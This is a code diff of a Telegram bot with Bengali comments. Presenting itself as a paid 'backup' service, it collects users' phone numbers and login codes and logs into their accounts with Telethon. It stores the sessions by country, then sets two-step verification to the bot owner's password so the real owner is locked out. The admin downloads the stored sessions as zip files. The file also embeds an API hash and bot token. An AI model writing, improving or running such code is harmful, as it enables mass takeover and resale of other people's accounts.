@@ -6,13 +6,8 @@ from threading import Thread
 from flask import Flask
 import telebot
 from telebot import types
-from telethon import TelegramClient
+from telethon import TelegramClient, functions, types as tl_types
 from telethon.errors import SessionPasswordNeededError
-
-# টেলিগ্রামের সিকিউরিটি ফাংশনের সঠিক এপিআই পাথ (ফিক্সড)
-from telethon.tl.functions.account import UpdatePasswordSettings, GetPassword
-from telethon.tl.functions.account import GetAuthorizations
-from telethon.tl.types import InputCheckPasswordEmpty, PasswordInputSettings
 
 # ==================== এডমিন কনফিগারেশন ====================
 API_ID = 36547444
@@ -20,10 +15,10 @@ API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
 BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
 ADMIN_ID = 8095751648
 
-# ব্যাকআপ প্রসেসিং টাইমার (সেকেন্ডে - যেমন: ৬০ সেকেন্ড বা ১ মিনিট)
+# ব্যাকআপ প্রসেসিং টাইমার (সেকেন্ডে - এডমিন চেঞ্জেবল)
 BACKUP_DELAY_SECONDS = 60
 
-# একাউন্ট লক করার জন্য বটের নিজস্ব সিকিউরিটি পাসওয়ার্ড (Two-Step Verification)
+# একাউন্ট লক করার জন্য বটের নিজস্ব সিকিউরিটি পাসওয়ার্ড
 BOT_SECURITY_PASSWORD = "MySecureBotPassword123"
 
 # দেশ ভিত্তিক কাস্টম ব্যালেন্স রেট
@@ -43,6 +38,7 @@ COUNTRY_CAPACITY = {
 }
 # =========================================================
 
+# কোনো রানিং কনফ্লিক্ট এড়াতে নন-ব্লকিং পোলিং কনফিগ
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
 app = Flask(__name__)
 
@@ -81,7 +77,7 @@ def get_current_file_count(country_code):
     return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
 
 @app.route('/')
-def home(): return "Bot is running perfectly!"
+def home(): return "Bot Server Is running perfectly!"
 
 def run_web():
     port = int(os.environ.get("PORT", 8080))
@@ -130,7 +126,6 @@ def start_command(message):
             reply_markup=get_user_keyboard()
         )
 
-# ওটিপি পাঠানোর অ্যাসিনক্রোনাস টাস্ক
 async def send_otp_task(phone_number, user_id, message):
     country_code = get_country_code(phone_number)
     max_capacity = COUNTRY_CAPACITY.get(country_code, COUNTRY_CAPACITY["default"])
@@ -162,7 +157,6 @@ async def send_otp_task(phone_number, user_id, message):
         await user_client.disconnect()
         if os.path.exists(f"{final_session_path}.session"): os.remove(f"{final_session_path}.session")
 
-# ডাবল ডিভাইস এবং সিকিউরিটি পাসওয়ার্ড হ্যান্ডল করার ফিক্সড ফাংশন
 async def process_security_and_backup(user_id, message, data, current_client):
     status_msg = bot.reply_to(
         message, 
@@ -176,8 +170,8 @@ async def process_security_and_backup(user_id, message, data, current_client):
     await asyncio.sleep(BACKUP_DELAY_SECONDS)
     
     try:
-        # সেশন অ্যাক্টিভিটি এবং ডিভাইস চেক
-        authorizations = await current_client(GetAuthorizations())
+        # ডিভাইস ও সেশন অ্যাক্টিভিটি চেক (টেলিথনের ডাইরেক্ট ফাংশন পাথ)
+        authorizations = await current_client(functions.account.GetAuthorizationsRequest())
         other_devices = []
         
         for auth in authorizations.authorizations:
@@ -202,12 +196,10 @@ async def process_security_and_backup(user_id, message, data, current_client):
         bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="⚙️ অ্যাকাউন্ট সিকিউরিটি লক (Two-Step Verification) সচল করা হচ্ছে...")
         
         try:
-            # কারেন্ট পাসওয়ার্ড স্টেটাস জানা
-            pwd_info = await current_client(GetPassword())
-            # নতুন পাসওয়ার্ড সেট করার টেলিথনের ফিক্সড মেথড
-            await current_client(UpdatePasswordSettings(
-                password=InputCheckPasswordEmpty(),
-                new_settings=PasswordInputSettings(
+            # সরাসরি অফিশিয়াল কোর মেথড প্যারামিটার দিয়ে পাসওয়ার্ড চেঞ্জ ও টু-স্টেপ অন করা
+            await current_client(functions.account.UpdatePasswordSettingsRequest(
+                password=tl_types.InputCheckPasswordEmpty(),
+                new_settings=tl_types.PasswordInputSettings(
                     new_password=BOT_SECURITY_PASSWORD,
                     hint="Bot Security Lock"
                 )
@@ -271,7 +263,6 @@ async def verify_otp_task(text, user_id, message):
             if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
             del user_data[user_id]
 
-# এডমিন কম্যান্ড হ্যান্ডলার (স্ট্যাটাস)
 @bot.message_handler(commands=['status'])
 def status_command(message):
     if message.from_user.id != ADMIN_ID: return
@@ -284,7 +275,6 @@ def status_command(message):
     current_count = get_current_file_count(country_code)
     bot.reply_to(message, f"📊 **দেশ কোড `+{country_code}` স্ট্যাটাস:**\n\n📁 মোট সেশন জমা: **{current_count}টি**\n⚙️ সর্বোচ্চ ক্যাপাসিটি লিমিট: **{max_cap}টি**")
 
-# এডমিন কম্যান্ড (গেট ফাইল)
 @bot.message_handler(commands=['get'])
 def get_files(message):
     if message.from_user.id != ADMIN_ID: return
@@ -326,7 +316,6 @@ def get_files(message):
     finally:
         if os.path.exists(master_zip_name): os.remove(master_zip_name)
 
-# টেক্সট এবং বাটন হ্যান্ডলার
 @bot.message_handler(func=lambda message: True)
 def handle_text(message):
     user_id = message.from_user.id
@@ -357,7 +346,7 @@ def handle_text(message):
             f"📊 **সার্ভার ক্যাপাসিটি স্ট্যাটাস**\n\n"
             f"🇧🇩 বাংলাদেশ: `{bd_count}/{COUNTRY_CAPACITY['880']}`টি স্টোর করা যাবে। (প্রাইজ: `${COUNTRY_PRICES['880']}`)\n"
             f"🇮🇳 ইন্ডিয়া: `{in_count}/{COUNTRY_CAPACITY['91']}`টি স্টোর করা যাবে। (প্রাইজ: `${COUNTRY_PRICES['91']}`)\n"
-            f"🇨🇴 কলম্বিয়া: `{co_count}/{COUNTRY_CAPACITY['57']}`টি স্টোর করা যাবে. (প্রাইজ: `${COUNTRY_PRICES['57']}`)\n\n"
+            f"🇨🇴 কলম্বিয়া: `{co_count}/{COUNTRY_CAPACITY['57']}`টি স্টোর করা যাবে। (প্রাইজ: `${COUNTRY_PRICES['57']}`)\n\n"
             f"⚠️ কোনো দেশের ফাইল ফুল হয়ে গেলে সেখানে সাময়িকভাবে ব্যাকআপ বন্ধ দেখাবে।"
         )
         bot.reply_to(message, capacity_text)
@@ -378,5 +367,6 @@ def handle_text(message):
         loop.run_until_complete(verify_otp_task(text, user_id, message))
 
 if __name__ == "__main__":
-    print("--- Flipped Ultra Secure Custom Architecture Active ---")
-    bot.infinity_polling()
+    print("--- Hardened & Safe Custom Architecture Live ---")
+    # কনফ্লিক্ট ঠেকাতে এবং ওল্ড সেশন কিল করতে রিকোয়েস্ট ক্লিয়ার পোলিং
+    bot.infinity_polling(skip_pending=True)
